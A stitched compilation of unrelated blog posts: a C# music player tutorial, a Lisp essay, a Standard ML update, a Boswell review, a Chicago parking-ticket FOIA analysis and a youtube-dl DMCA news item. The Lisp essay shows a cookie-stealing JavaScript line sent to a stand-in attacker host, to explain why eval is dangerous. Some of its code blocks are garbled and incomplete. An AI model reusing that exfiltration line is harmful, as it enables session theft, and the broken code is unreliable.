            <span>Thread</span><span>.</span><span>Sleep</span><span>(</span><span>1000</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The last order of business was to wire up the PlayAudioFile() method to the UI, and I did so by replacing the Open menu line of code in Gui.cs to the following:</p>

<div><div><pre><code><span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Player</span><span>.</span><span>PlayAudioFile</span><span>()),</span>
</code></pre></div></div>

<p>After compiling and opening the player, I was now greeted with the sweet sounds of music! Although it was exciting to hear music this early on, there were quite a few catches however. These included:</p>

<ul>
  <li>No exception handling if the MP3 file is missing</li>
  <li>No way to load other music files</li>
  <li>Missing playback controls and volume</li>
  <li>Playback status indicator</li>
</ul>

<p>Although these features were missing, I still find it quite exciting whenever I’m able to make tangible progress in a project and it provides some motivation to work through some of the more tedious parts.</p>



<p>In Part One of this guide, we learned how to implement a simple UI using Terminal.Gui and then use it to play an audio file with NAudio. I would have liked to make MusicSharp cross-platform, but unfortunately According to NAudio creator <a href="https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/Mark%20Heath" target="_blank">Mark Heath</a>, “A large part of the [NAudio] codebase consists of P/Invoke or COM interop wrappers around the various Windows audio APIs. So even if a .NET Standard build were to be created, much of the functionality would fail to work if you tried to use it in a .NET Core app running on Linux.”.</p>

<p>Curious, I tested MusicSharp on my Macbook Pro (running Catalina) and the program ran but crashed once I tried to open an MP3:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-macOS-Catalina.png" width="750" height="473" alt="MusicSharp first build running on macOS Catalina"></p>

<p>In these early stages of testing, MusicSharp is currently consuming 15mb of memory and negligible CPU usage while running in debug mode, and it’ll be interesting to see where the performance numbers end up as the player functionality gets more fleshed out. Be sure to stay tuned for part two of this guide, as we will refactor our current code to make it easier to test and more loosely coupled using Interfaces and Dependency Injection!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>((</span><span>ins</span><span>) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>ins</span><span>.</span><span>functionName</span><span>](</span><span>...</span><span>ins</span><span>.</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>

<span>  };</span>
<span>};</span></code></pre><p>When we find a <code>fn</code>  instruction, we run <code>parseFnInstruction</code>. This produces a new javascript function. We would replace <code>drawTriangle</code> here with that function:</p><pre><code><span>[</span><span>"drawTriangle"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>So when that function is run, <code>values</code> would become:</p><pre><code><span>[{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>After that, </p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span></code></pre><p>Would create a new <code>variables</code> object, that includes a mapping of the function arguments to these newly provided values:</p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>  </span><span>...</span><span>oldVariables</span><span>,</span>

<span>  color: </span><span>"blue"</span><span>, </span>

<span>      ],</span></code></pre><p>And run it through <code>parseInstruction</code>, with our <code>newVariables</code>. With that <code>"left"</code> would be looked up as a variable and map to <code>{x: 0, y: 0}</code>. </p><p>If we did that, voila, the major work to support functions would be done!</p><p>Let’s follow through on our plan. The first thing we need to do, is to have <code>parseInstruction</code> accept <code>variables</code> as an argument. To do that, we need to update <code>parseInstruction</code>, and wherever it's called:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>

<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Next, we’ll want to add a special check to detect if we have a “fn” instruction:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>

<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Now, our <code>parseFnInstruction</code>: </p><pre><code><span>const</span><span> </span><span>mapArgsWithValues</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>values</span><span>) </span><span>=&gt;</span><span> { </span>

        <p>Incredibly, Standard ML implementations are still actively
developed. <a href="http://mlton.org/">MLton</a>, <a href="https://polyml.org/">Poly/ML</a>,
<a href="https://elsman.com/mlkit/">MLKit</a>,
<a href="https://www.pllab.riec.tohoku.ac.jp/smlsharp/">SML#</a> and
<a href="http://smlnj-gforge.cs.uchicago.edu/scm/viewvc.php/?root=smlnj">SML/NJ</a>
are the most prominent. Discussion on the future direction of Standard
ML <a href="https://github.com/SMLFamily/Successor-ML/issues">remains healthy as
well</a>.</p>
<p>And somehow OCaml's lesser known cousin still beats out OCaml for
multicore threading support (in Poly/ML).</p>
<p>While MLton hasn't merged with
<a href="https://github.com/kayceesrk/multiMLton">MultiMLton</a> or
<a href="https://github.com/UBMLtonGroup/RTMLton">RTMLton</a> to support
multicore, a <a href="https://github.com/mpllang/mpl">new fork of MLton with
parallelism</a> is pretty far along and
in active development at CMU.</p>
<p>
  A commentor shared
  <a href="https://github.com/ManticoreProject/manticore">Manticore</a>,
  another implementation with parallelism support in active
  development at UChicago.
</p><p>Furthermore, the last few years have welcomed some entirely new
implementations. <a href="https://github.com/KeenS/webml">WebML</a>, by a
prominent open source hacker, is written in Rust and compiles Standard
ML to WebAssembly. <a href="https://sosml.org/">SOSML</a> is an interpreter
written in TypeScript by former students of Saarland University. It
features <a href="https://sosml.org/editor">a nifty online
IDE</a>.</p>
<p>
  A commenter
  shared <a href="https://github.com/SomewhatML/sml-compiler">SomewhatML</a>,
  an actively developing compiler for Standard ML written in Rust.
</p><p>There have also been some new experimental spins on Standard ML in
the last few years. <a href="https://github.com/julianhyde/morel">Morel</a> is an
interpreter with some nice syntax extensions written in Java by the
author of Apache Calcite. And <a href="https://github.com/elpinal/bright-ml">Bright
ML</a> is a spin on Standard ML and
OCaml written in Standard ML (and using the abandoned <a href="https://mosml.org/">Moscow
ML</a> compiler of all implementations).</p>
<p>So if you're looking for an easy intro to the ML family of languages,
I still recommend the simplicity and performance of Standard ML and
its small but definitely, surprisingly, not dead community. :)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn2189487741" rel="footnote"><sup id="fnref2189487741">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn2189487742" rel="footnote"><sup id="fnref2189487742">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn2189487743" rel="footnote"><sup id="fnref2189487743">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn2189487744" rel="footnote"><sup id="fnref2189487744">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn2189487745" rel="footnote"><sup id="fnref2189487745">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

Using FOIA Data and Unix to halve major source of parking tickets
</a></h3>

<p>August 13, 2018 —

<h3>Intro</h3>

<p>This'll be my first blog post on the internet, ever. Hopefully it's interesting and accurate. Please point out any mistakes if you see any!</p>

<p>In 2016, I did some work in trying to find some hotspot areas for parking tickets to see if a bit of data munging could reduce those area's parking tickets. In the end, I only really got one cleaned up, but it was <em>one of</em> the most-ticketed spots in all of Chicago and led to about a 50% reduction in parking tickets.</p>

<p>Here's a bit of that story.</p>

<h3>Getting the data through FOIA:</h3>

<p>The system Chicago uses to store its parking tickets is called CANVAS. It's short for "City of Chicago Violation, Noticing and Adjudication Business Process And System Support" [sic] and managed by IBM.  Its most recent contract started in 2012, expires in 2022, and has a pricetag of over $190 million.</p>

<p>Most of Chicago's contracts and their Requests For Procurement (RFP) PDFs are published online. In CANVAS's contracts it gives a fair amount of info on CANVAS's backend infrastructure, including the fact that it uses Oracle 10g. In other words, a FOIA request can be fulfilled by IBM running some simple SQL. </p>

<p><a href="https://www.cityofchicago.org/content/dam/city/depts/dps/ContractAdministration/Specs/2011/Spec92488II.pdf">CANVAS Technical Spec</a>
<br><a href="https://data.cityofchicago.org/Administration-Finance/CANVAS/sbf2-65yk/data">CANVAS Contract</a>
<br><a href="http://ecm.cityofchicago.org/eSMARTContracts/service/DPSWebDocumentViewer?id={C8B55BB4-16F1-4941-B140-CAEA322CFFCD}&amp;osName=eContentContracts&amp;el=0&amp;image=image">CANVAS Request For Procurement (RFP) and Contract</a></p>

<p>With that information at hand, and a couple failed FOIA requests later, I sent this request to get the parking ticket data from Jan 1, 2009 to Mar 10, 2016:</p>

<p><em>"Please provide to me all possible information on all parking tickets between 2009 and the present day. This should include any information related to the car (make, etc), license plate, ticket, ticketer, ticket reason(s), financial information (paid, etc), court information (contested, etc), situational (eg, time, location), and photos/videos.  Ideally, this should also include any relevant ticket-related information stored within CANVAS.</em></p>

<p><em>[...]</em></p>

<p><em>This information will be used for data analysis for research.</em></p>

<p><em>Thanks in advance,</em></p>

<p><em>Matt Chapman"</em></p>

<h3>Data</h3>
<p>About a month later, a guy named Carl (in a fancy suit), handed me a CD with some <em>extremely</em> messy data in a semicolon delimited file named <code>A50462_TcktsIssdSince2009.txt</code>. The file had info on 17,806,818 parking tickets and spans from Jan 1, 2009 to Mar 10, 2016.</p>

<p>The data itself looks like this:</p>

<pre><code>head -5 A50462_TcktsIssdSince2009.txt

</code></pre>

<h4>Some things to note about the data:</h4>

<ol>
<li>The file is semicolon delimited.</li>
<li>Each address is hand typed on a handheld device, often with gloves.</li>
<li>There are <em>millions</em> of typos in the address column. Including over 50,000 semicolons!</li>
<li>There is no lat/lon.</li>
</ol>

<p>What that amounts to is an extremely, extremely messy and unpredictable dataset that's incredibly to difficult to accurately map to lat/lon, which is needed for any sort of comprehensive GIS analysis.  There are a bunch of geocoder services that can help out here, but most of them have about a 50% accuracy rate. That said, with the help of a bit of scrubbing, that number can be boosted to closer to 90%. Another post for another time.</p>

<p>Here’s a sample list of Lake Shore Drive typos:</p>

<pre><code>Laks Shore Dr
Lawkeshore Dr West
Lkaeshore Dr
Lkae Shore Dr
Lkae Shore Drive
Lkaeshore Dr West
</code></pre>

<h3>Original Analysis</h3>

<p>I was particularly interested in finding areas that had hotspot areas that stood out. A lot of my time was spent just throwing hacky code at the problem and eventually wrote out two series of (hacky) commands that led to identifying a potentially fixable spot.</p>

<p>Originally, the work and analysis I was doing was with a combination of unix commands and gnuplot. Since then, I've migrated my code to python + matplotlib + SQL. But, for the sake of this blog, I wanted to show the original analysis.</p>

<p>Get count of tickets at addresses and ignoring first two digits:</p>

<pre><code>$ mawk -F';' '{print $7}' all_tickets.orig.txt
    | sed -r 's/^([0-9]*)[0-9][0-9] (.*)/\100 \2/'
    | sed -r 's/ (BLVD|ST|AV|AVE|RD)$//'
    | sort | uniq -c | sort -nr

  79320 1900 W OGDEN
  <b>60059 1100 N STATE</b>
  50594 100 N WABASH
  44503 1400 N MILWAUKEE

  43030 2800 N BROADWAY
  42294 2100 S ARCHER
  42116 1900 W HARRISON
</code></pre>

<p>Get count of tickets, by ticket type, at specific addresses:</p>

<pre><code>$ mawk -F';' '{print $9,$7}' A50462_TcktsIssdSince2009.txt
    | sed -r 's/ (BLVD|ST|AV|AVE|RD)$//'
    | sort --parallel=4 | uniq -c | sort -nr

<p>Both bits of code roughly show that there's something going on at 1100N state street, and 1166 N State St looks particularly suspicious..</p>

<p>So, have a look at the original set of signs:</p>

<center><img src="https://mchap.io/assets/2016signs.png"></center>

<p>Things going on that make this spot confusing:</p>

<ol>
<li>This is a taxi stand from 7pm to 5am for three cars’ lengths. Parking in a taxi stand is a $100 ticket.</li>
<li>When this spot isn’t a taxi stand, it’s metered parking – for a parking meter beyond an alleyway.</li>
<li><a href="https://mchap.io/assets/parkingreceipt.jpg">It’s possible to pay for parking here after 7pm</a>, which makes it look like parking is acceptable – especially with the “ParkChicago” sign floating there.</li>
<li>Confusion creates more confusion – if one car parks there, then more cars follow. Cha-ching.</li>
</ol>

<h3>Contacting the 2nd Ward</h3>

<p>With all that in mind, I contacted the second ward’s alderman’s office on April 12 explaining this, and got back this response:</p>

<p><em>"Hello Matt,</em></p>

<p><em>[…]The signs and the ordinance are currently being investigated.</em></p>

<p><em>In the interim, I highly recommend that you do not park there to avoid any further tickets.</em></p>

<p><em>Lisa&nbsp;Ryan</em></p>

<p><em>Alderman Brian Hopkins - 2nd&nbsp;Ward"</em></p>

<h3>The Fix</h3>

<p>On 1/11/17 I received this email from Lisa:</p>

<p><em>"Matt,</em></p>

<p><em>I don't know if you noticed the additional&nbsp;signage installed&nbsp;on State Street at the 3 Taxi Stand.</em></p>

<p><em>This should elevate [sic] any further confusion of vehicle parking.</em></p>

<p><em>Thank you for your patience.</em></p>

<p><em>Lisa Ryan"</em></p>

<p>Sure enough, two new signs were added!</p>

<center><img src="https://mchap.io/assets/new_signs.png"></center>

<p>The new taxi stand sign sets a boundary for a previously unbounded taxi stand. The No Parking sign explicitly makes it clear that parking here during taxi stand hours is a fineable offense. Neat!</p>

<p>And then there's this guy:
</p><center><img src="https://mchap.io/assets/thisguy.png"></center>

<h3>Results</h3>

<p>I recently decided to look at the number of tickets at that spot. Armed with a new set of data from another FOIA request, I did some analysis with python, pandas, and SQL. What I found is that the addition of a new sign effectively led to a 50% reduction in parking tickets between 1150 and 1200 N State St. Adding it all up, that's about 400 tickets fewer in 2017 and 200 so far in 2018 compared to 2016. All in all, that's about $60,000 worth in parking tickets!</p>

<p>The drop in slope to about 50% matches perfectly with Lisa’s email:</p>

<p>And then comparing 2016 to 2017:
</p><center><img src="https://mchap.io/assets/plot_splitbyyear.png"></center>

<h3>What's next?</h3>

<p>All in all, the number of parking tickets is going up in Chicago, and this work shows that <em>something</em> can be done, even if small.</p>

<center><img src="https://mchap.io/assets/plot_fulldatasetcumsum.png"></center>

<p>This work is only on one small section of road, but I'm convinced that similar work can be on a systematic scale. It's mostly just a matter of digging through data and working directly with each ward.</p>

<p>The later analysis done here was also only done on the most recent dataset that the Department of Revenue they gave me. The two datasets have a different set of columns, so the two datasets need to be combined still. I hope to accomplish that soon! </p>

                    <p><br>Friday night on the 23<sup>rd</sup> of October the ‘Recording Industry Association of America, Inc. (RIAA)’ sent a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA request </a>to GitHub asking that the popular YouTube downloading software ‘youtube-dl’ be taken down. GitHub responded as by immediately removing the repositories and 17 forked pieces of software from it’s site.</p><figure><img src="https://news.perthchat.org/content/images/2020/10/Screener.png" alt="" srcset="https://news.perthchat.org/content/images/size/w600/2020/10/Screener.png 600w, https://news.perthchat.org/content/images/size/w1000/2020/10/Screener.png 1000w, https://news.perthchat.org/content/images/2020/10/Screener.png 1405w" sizes="(min-width: 720px) 720px"></figure><p>Most DMCA notices are regarding the unauthorised distribution of a particular piece of media, and they request that a media be taken down. This DMCA notice was different since it’s targeting tools that can be used to reproduce copyrighted media.</p><p>Youtube-DL is licensed under the <a href="https://en.wikipedia.org/wiki/Unlicense">Unlicense</a>, an anti-copyright license that promises ownership of the software to the public domain. As such it is usually considered lawful to freely distribute the software itself. There are many other places you can find copies of this software besides the current maintainers GitHub page.</p><div><p>The notice claimed the youtube-dl software was a ‘Anticircumvention Violation’ as well as a violation of YouTube’s terms of service. It requested that:</p><p><em>“In light of the above noted copyright infringements and anticircumvention violations, we ask that you immediately take down and disable access to the youtube-dl source code at all of its locations where it is hosted on GitHub, including without limitation those locations in the representative list set forth above.”</em></p></div><p>It also draws attention to the examples featured in the youtube-dl source code which include examples of how to download copyrighted music from Icona Pop, Justin Timberlake and Taylor Swift. The notice also claimed that:</p><p><em>“The clear purpose of this source code is to (i) circumvent the technological protection measures used by authorised streaming services such as YouTube, and (ii) reproduce and distribute music videos and sound recordings owned by our member companies without authorization for such use.”</em></p><p>Although the youtube-dl software cannot be used to distribute music, only to reproduce it. It’s also possible to use youtube-dl to reproduce public domain or creative commons work that people do have the right to copy and redistribute.</p><p>For now the software remains widely distributed and used. It can still be accessed through the <a href="https://yt-dl.org/download.html">existing yt-dl.org website.</a> Last year the RIAA was <a href="https://torrentfreak.com/riaa-delists-youtube-rippers-from-google-using-rare-anti-circumvention-notices-191108/">able to get 5 YouTube ‘ripper’ sites removed from the Google search engine.</a></p><figure><img src="https://news.perthchat.org/content/images/2020/10/Screener-1.png" alt="" srcset="https://news.perthchat.org/content/images/size/w600/2020/10/Screener-1.png 600w, https://news.perthchat.org/content/images/size/w1000/2020/10/Screener-1.png 1000w, https://news.perthchat.org/content/images/2020/10/Screener-1.png 1366w" sizes="(min-width: 720px) 720px"></figure><h3 id="perthchat-news-interview-with-philipp-hagemeister">Perthchat News Interview With Philipp Hagemeister</h3><p><br>I reached out to previous maintainer Phillip Hagemeister, who had this to say about the incident:</p><p><strong>Are you worried you will see any personal damages from this?</strong></p><blockquote>I received a seize and desist letter from German lawyers a couple of weeks ago. However, there are a number of technical inaccuracies in that letter; in particular the lawyers did not seem to have understood that my maintainership of youtube-dl ended years ago. Since this is an ongoing legal issue, that's all I'll say about that.</blockquote><p><strong>Are you going to change the examples in the source code and remove references to the copyrighted works of Icona Pop, Justin Timberlake and Taylor Swift?</strong></p><blockquote>I am no longer involved in the youtube-dl project, but if I were:</blockquote><blockquote>I would remove the test cases. These videos were never fully downloaded anyways; they are automated test cases where the test just downloads the first 10KB, which amounts to a couple of seconds at most. This is certainly fair use, but the project is fully functional without these test cases.</blockquote><blockquote>I would remove the referenced code, even though I believe it to be legal. It's an extremely small part of youtube-dl (which despite the name supports over 1000 other 